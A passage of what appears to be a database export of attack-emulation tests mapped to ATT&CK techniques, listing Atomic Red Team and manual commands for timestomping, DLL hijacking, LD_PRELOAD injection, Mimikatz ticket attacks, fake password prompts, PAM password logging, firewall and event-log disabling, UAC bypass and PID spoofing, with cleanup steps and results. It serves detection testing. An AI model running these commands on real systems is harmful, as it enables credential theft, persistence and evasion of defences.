"$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\timestomp.ps1 -ErrorAction Ignore\\nRemove-Item #{file_path}\\\\kxwn.lock -ErrorAction Ignore", "command": ["import-module #{file_path}\\\\timestomp.ps1\\ntimestomp -dest \\"#{file_path}\\\\kxwn.lock\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Timestomp a File", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path -path \\"#{file_path}\\\\kxwn.lock\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_path", "value": "$env:appdata\\\\Microsoft"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net use c: #{share_name}\\nnet share test=#{share_name} /REMARK:\\"test share\\" /CACHE:No\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Add Network Share", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "share_name", "value": "\\\\\\\\test\\\\share"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net share #{share_name} /delete\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Remove Network Share", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "share_name", "value": "\\\\\\\\test\\\\share"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Remove-SmbShare -Name #{share_name}\\nRemove-FileShare -Name #{share_name}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Remove Network Share PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "share_name", "value": "\\\\\\\\test\\\\share"}], "execution_status": "Pass"}, {"cleanup": "del %APPDATA%\\\\updater.exe >nul 2>&1\\ndel %APPDATA%\\\\amsi.dll >nul 2>&1\\n", "command": ["copy %windir%\\\\System32\\\\windowspowershell\\\\v1.0\\\\powershell.exe %APPDATA%\\\\updater.exe\\ncopy %windir%\\\\System32\\\\amsi.dll %APPDATA%\\\\amsi.dll\\n%APPDATA%\\\\updater.exe -Command exit\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "DLL Search Order Hijacking - amsi.dll", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "taskkill /F /IM #{process_name} >nul 2>&1\\n", "command": ["#{gup_executable}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "DLL Side-Loading using the Notepad++ GUP.exe binary", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{gup_executable}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "process_name", "value": "calculator.exe"}, {"key": "gup_executable", "value": "PathToAtomicsFolder\\\\T1574.002\\\\bin\\\\GUP.exe"}], "execution_status": "Pass"}, {"cleanup": "sudo sed -i '\\\\~#{path_to_shared_library}~d' /etc/ld.so.preload\\n", "command": ["LD_PRELOAD=#{path_to_shared_library} ls\\n"], "executor": "bash", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Shared Library Injection via LD_PRELOAD", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\\n"], "input_arguments": [{"key": "path_to_shared_library_source", "value": "PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c"}, {"key": "path_to_shared_library", "value": "/tmp/T1574006.so"}], "execution_status": "Pass"}, {"cleanup": "sc stop \\"Example Service\\" >nul 2>&1\\nsc delete \\"Example Service\\" >nul 2>&1\\ndel \\"C:\\\\Program Files\\\\windows_service.exe\\" >nul 2>&1\\ndel \\"C:\\\\program.exe\\" >nul 2>&1\\ndel \\"C:\\\\Time.log\\" >nul 2>&1\\n", "command": ["copy #{service_executable} \\"C:\\\\Program Files\\\\windows_service.exe\\"\\ncopy #{service_executable} \\"C:\\\\program.exe\\"\\nsc create \\"Example Service\\" binpath= \\"C:\\\\Program Files\\\\windows_service.exe\\" Displayname= \\"Example Service\\" start= auto\\nsc start \\"Example Service\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Execution of program.exe as service with unquoted service path", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "service_executable", "value": "PathToAtomicsFolder\\\\T1574.009\\\\bin\\\\WindowsServiceExample.exe"}], "execution_status": "Pass"}]}}}}
316	\N		\N	yes	P2	\N	2021-07-30 02:55:10.912789+00	T1559.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "NA", "command": [], "executor": "manual", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Execute Commands", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["start $PathToAtomicsFolder\\\\T1559.002\\\\bin\\\\DDE_Document.docx\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Execute PowerShell script via Word DDE", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["start $PathToAtomicsFolder\\\\T1559.002\\\\bin\\\\DDE_Document.docx\\n"], "executor": "manual", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "DDEAUTO", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
244	\N		\N	yes	https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5	\N	2021-06-29 10:16:09.516087+00	T1559.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "reg delete HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{00000001-0000-0000-0000-0000FEEDACDC}", "command": ["xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}"], "executor": ["Cmd", "pwsh"], "platform": "Windows", "file_name": "reg_add.reg, power.sct", "pre_command": ["regedit.exe /S reg_add.reg"], "ability_name": "", "created_date": "29/06/2021", "post_command": ["get-process"], "modified_date": "", "pre-requisite": ["reg_add.reg", " power.sct"], "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
247	\N		\N	yes		\N	2021-07-02 06:22:42.9795+00	T1546.005	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Invoke-AtomicTest T1546.005 -Cleanup", "command": ["Invoke-AtomicTest T1546.005 -TestNumbers 1"], "executor": ["pwsh"], "platform": " Linux", "file_name": "T1546.005.yml", "pre_command": [], "ability_name": "", "created_date": "02/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Invoke-AtomicTest T1546.005 -GetPrereqs"], "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
30	\N		bat	yes	\N	\N	2021-07-02 09:35:55.846803+00	T1560.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["@ECHO OFF\\n\\nmakecab %windir%\\\\system32\\\\calc.exe data.cab /L \\"C:/Archive\\""], "executor": ["cmd"], "platform": "", "file_name": "MuddyWater_T1560_001.bat", "platforms": "Windows", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.455Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "", "command": ["1. upload and then execute MuddyWater_T1560_001.bat using below commands.\\nagent_id> upload MuddyWater_T1560_001.bat\\nagent_id> shell MuddyWater_T1560_001.bat\\n\\nIt will execute below command to compress calc.exe and store under C:\\\\Archive folder.\\n\\nmakecab %windir%\\\\system32\\\\calc.exe data.cab /L \\"C:/Archive\\""], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.466Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
44	\N		reg	yes	null	\N	2021-07-02 09:45:31.284033+00	T1562.006	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\EventLog-Application\\\\{01090065-b467-4503-9b28-533766761087}]\\n\\"Enabled\\"=dword:00000000\\n"], "executor": [""], "platform": "", "file_name": "T1562_006.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.574Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "cmd", "command": ["msta.exe"], "executor": ["Cmd"], "platform": "", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "02/07/2021", "post_command": [], "modified_date": "02/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": ""}]}}}}
47	\N		\N	yes	\N	\N	2021-07-02 09:46:04.594947+00	T1083	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Run below command.\\nagent_id> dir C:\\\\ProgramData\\\\"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.611Z", "pre-requisite": [], "pre-requistes": "1. At least one listener is running.\\n2. powershell-empire launcher_bat is installed on endpoint.\\n3. Interact with agent.", "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
286	\N		\N	yes	P1	\N	2021-07-27 12:13:25.791049+00	T1550.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "NA", "command": ["#{mimikatz_exe} # kerberos::ptt #{user_name}@#{domain}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mimikatz Kerberos Ticket Attack", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "user_name", "value": "Administrator"}, {"key": "domain", "value": "atomic.local"}, {"key": "mimikatz_exe", "value": "PathToAtomicsFolder\\\\T1550.003\\\\bin\\\\mimikatz.exe"}], "execution_status": "Fail"}]}}}}
123	\N	\N	\N	yes	["1. To attack using malicious docs we need microsoft office (excel/word)"]	\N	2021-08-24 14:11:29.833223+00	T1204.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["[\\"1. https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.md\\"]"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.063Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
317	\N		\N	yes	P2	\N	2021-07-30 02:58:35.633278+00	T1056.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth\\n", "command": ["if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk sudo touch /tmp/system-auth.bk sudo echo \\"session    required    pam_tty_audit.so enable=* log_password\\" >> /etc/pam.d/password-auth sudo echo \\"session    required    pam_tty_audit.so enable=* log_password\\" >> /etc/pam.d/system-auth"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Living off the land Terminal Input Capture on Linux with pam.d", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["osascript -e 'tell app \\"System Preferences\\" to activate' -e 'tell app \\"System Preferences\\" to activate' -e 'tell app \\"System Preferences\\" to display dialog \\"Software Update requires that you type your password to apply changes.\\" & return & return  default answer \\"\\" with icon 1 with hidden answer with title \\"Software Update\\"'\\n"], "executor": "bash", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "AppleScript - Prompt User for Password", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["# Creates GUI to prompt for password. Expect long pause before prompt is available.    \\n$cred = $host.UI.PromptForCredential('Windows Security Update'", " ''", "[Environment]::UserName", " [Environment]::UserDomainName)\\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\\nwrite-warning $cred.GetNetworkCredential().Password\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "PowerShell - Prompt User for Password", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
149	\N		\N	yes	P1	\N	2021-07-27 10:43:30.474047+00	T1546.013	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.013/T1546.013.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.495Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "$oldprofile = cat $profile | Select-Object -skiplast 1\\nSet-Content $profile -Value $oldprofile\\n", "command": ["Add-Content #{ps_profile} -Value \\"\\"\\nAdd-Content #{ps_profile} -Value \\"Start-Process #{exe_path}\\"\\npowershell -Command exit\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Append malicious start-process cmdlet", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": ["if (Test-Path #{ps_profile}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "exe_path", "value": "calc.exe"}, {"key": "ps_profile", "value": "$profile"}], "execution_status": "Pass"}]}}}}
275	\N		\N	no	P1	\N	2021-07-27 10:29:38.347289+00	T1562.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "NA", "command": ["if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \\"6\\" ];\\nthen\\n  service iptables stop\\n  chkconfig off iptables\\n  service ip6tables stop\\n  chkconfig off ip6tables\\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \\"7\\" ];\\n  systemctl stop firewalld\\n  systemctl disable firewalld\\nfi\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Disable iptables firewall", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "netsh advfirewall set currentprofile state on >nul 2>&1\\n", "command": ["netsh advfirewall set currentprofile state off\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Disable Microsoft Defender Firewall", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "netsh advfirewall reset >nul 2>&1\\n", "command": ["netsh advfirewall firewall set rule group=\\"remote desktop\\" new enable=Yes\\nnetsh advfirewall firewall set rule group=\\"file and printer sharing\\" new enable=Yes\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Allow SMB and RDP on Microsoft Defender Firewall", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "netsh advfirewall firewall delete rule name=\\"atomic testing\\" protocol=TCP localport=450 >nul 2>&1", "command": ["netsh advfirewall firewall add rule name=\\"atomic testing\\" action=allow dir=in protocol=TCP localport=450 \\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Opening ports for proxy - HARDRAIN", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "netsh advfirewall firewall delete rule name=\\"Open Port to Any\\" | Out-Null", "command": ["netsh advfirewall firewall add rule name=\\"Open Port to Any\\" dir=in protocol=tcp localport=#{local_port} action=allow profile=any"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Open a local port through Windows Firewall to any profile", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "local_port", "value": 3389}], "execution_status": "Pass"}, {"cleanup": "netsh advfirewall firewall delete rule name=\\"Atomic Test\\" | Out-Null\\nRemove-Item C:\\\\Users\\\\$env:UserName\\\\AtomicTest.exe -ErrorAction Ignore\\n", "command": ["Copy-Item #{exe_file_path} -Destination \\"C:\\\\Users\\\\$env:UserName\\" -Force\\nnetsh advfirewall firewall add rule name=\\"Atomic Test\\" dir=in action=allow program=\\"C:\\\\Users\\\\$env:UserName\\\\AtomicTest.exe\\" enable=yes\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Allow Executable Through Firewall Located in Non-Standard Location", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "exe_file_path", "value": "PathToAtomicsFolder\\\\T1562.004\\\\bin\\\\AtomicTest.exe"}], "execution_status": "Pass"}]}}}}
299	\N		\N	yes	P2	\N	2021-08-19 10:52:01.994656+00	T1134.004	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Stop-Process -Name \\"#{dll_process_name}\\" -ErrorAction Ignore\\nStop-Process -Name \\"#{spawnto_process_name}\\" -ErrorAction Ignore\\n", "command": [". $PathToAtomicsFolder\\\\T1134.004\\\\src\\\\PPID-Spoof.ps1\\n$ppid=Get-Process #{parent_process_name} | select -expand id\\nPPID-Spoof -ppid $ppid -spawnto \\"#{spawnto_process_path}\\" -dllpath \\"#{dll_path}\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Parent PID Spoofing using PowerShell", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "parent_process_name", "value": "explorer"}, {"key": "spawnto_process_path", "value": "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe"}, {"key": "dll_process_name", "value": "calculator"}, {"key": "dll_path", "value": "PathToAtomicsFolder\\\\T1134.004\\\\bin\\\\calc.dll"}, {"key": "spawnto_process_name", "value": "iexplore"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}' -ParentId #{parent_pid}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Parent PID Spoofing - Spawn from Current Process", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "file_path", "value": "$Env:windir\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"}, {"key": "parent_pid", "value": "$PID"}, {"key": "command_line", "value": "-Command Start-Sleep 10"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Parent PID Spoofing - Spawn from Specified Process", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "parent_pid", "value": "$PID"}, {"key": "test_guid", "value": "12345678-1234-1234-1234-123456789123"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Get-CimInstance -ClassName Win32_Process -Property Name", " CommandLine", " ProcessId -Filter \\"Name = 'svchost.exe' AND CommandLine LIKE '%'\\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Parent PID Spoofing - Spawn from svchost.exe", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "command_line", "value": "-Command Start-Sleep 10"}, {"key": "file_path", "value": "$Env:windir\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Parent PID Spoofing - Spawn from New Process", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "command_line", "value": "-Command Start-Sleep 10"}, {"key": "file_path", "value": "$Env:windir\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"}, {"key": "parent_name", "value": "$Env:windir\\\\System32\\\\notepad.exe"}], "execution_status": "Pass"}]}}}}
163	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1132.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1132.001/T1132.001.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.705Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
164	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1074.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/T1074.001.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.717Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
165	\N	\N	\N	yes	\N	\N	2021-08-24 14:11:29.833223+00	T1573	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1573/T1573.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.734Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}]}}}}
285	\N		\N	no	P1	\N	2021-07-27 12:07:05.777031+00	T1218.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "NA", "command": ["cmstp.exe /s #{inf_file_path}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "CMSTP Executing Remote Scriptlet", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_file_path", "value": "PathToAtomicsFolder\\\\T1218.003\\\\src\\\\T1218.003.inf"}], "execution_status": "Fail"}, {"cleanup": "NA", "command": ["cmstp.exe /s #{inf_file_uac} /au\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "CMSTP Executing UAC Bypass", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_file_uac", "value": "PathToAtomicsFolder\\\\T1218.003\\\\src\\\\T1218.003_uacbypass.inf"}], "execution_status": "Fail"}]}}}}
131	\N		reg	yes	P1	\N	2021-07-27 12:11:38.691635+00	T1547.005	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa]\\n\\"Security Packages\\"=hex(7):73,00,70,00,6f,00,74,00,6c,00,65,00,73,00,73,00,2e,\\\\\\n  00,64,00,6c,00,6c,00,00,00,00,00\\n  \\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\OSConfig]\\n\\"Security Packages\\"=hex(7):73,00,70,00,6f,00,74,00,6c,00,65,00,73,00,73,00,2e,\\\\\\n  00,64,00,6c,00,6c,00,00,00,00,00\\nreg add \\"hklm\\\\system\\\\currentcontrolset\\\\control\\\\lsa\\\\\\" /v \\"Security Packages\\" /d \\"kerberos\\\\0msv1_0\\\\0schannel\\\\0wdigest\\\\0tspkg\\\\0pku2u\\\\0mimilib\\" /t REG_MULTI_SZ /f\\nreg add \\"hklm\\\\system\\\\currentcontrolset\\\\control\\\\lsa\\\\\\" /v \\"Security Packages\\" /d \\"kerberos\\\\0msv1_0\\\\0schannel\\\\0wdigest\\\\0tspkg\\\\0pku2u\\\\0mimilib\\" /t REG_MULTI_SZ /f"], "executor": [""], "platform": "", "file_name": "T1547_005.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.180Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "", "command": ["# run these in sequence\\n$SecurityPackages = Get-ItemProperty HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'\\n$SecurityPackagesUpdated = $SecurityPackages\\n$SecurityPackagesUpdated += \\"#{fake_ssp_dll}\\"\\nSet-ItemProperty HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated\\n\\n# revert (before reboot)\\nSet-ItemProperty HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa -Name 'Security Packages' -Value $SecurityPackages\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Modify SSP configuration in registry", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [{"key": "fake_ssp_dll", "value": "not-a-ssp"}], "execution_status": "Fail"}]}}}}
243	\N		\N	yes	P2	\N	2021-07-30 02:48:45.992139+00	T1055.012	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "del /f wlbsctrl.dll", "command": ["net users", " sc.exe stop IKEEXT", " sc.exe start IKEEXT", " net users"], "executor": ["Cmd"], "platform": "Windows", "file_name": "wlbsctrl.dll", "pre_command": ["cp wlbsctrl.dll C:\\\\\\\\Windows\\\\\\\\System32"], "ability_name": "", "created_date": "29/06/2021", "post_command": [], "modified_date": "", "pre-requisite": ["wlbsctrl.dll"], "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "sc delete SvcHostDemo", "command": ["sc create SvcHostDemo binpath= \\"%SystemRoot%\\\\System32\\\\svchost.exe -k demo\\" type= share", " start.cmd", " sc start SvcHostDemo"], "executor": ["Cmd"], "platform": "Windows", "file_name": "svchost.reg, parameters.reg", "pre_command": ["reg import parameters.reg", " reg import svchost.reg"], "ability_name": "", "created_date": "29/06/2021", "post_command": [], "modified_date": "", "pre-requisite": ["svchost.reg", " parameters.reg"], "input_arguments": [], "execution_status": "Pass"}], "atomicred": [{"cleanup": "Stop-Process -Name \\"#{spawnto_process_name}\\" -ErrorAction Ignore\\n", "command": [". 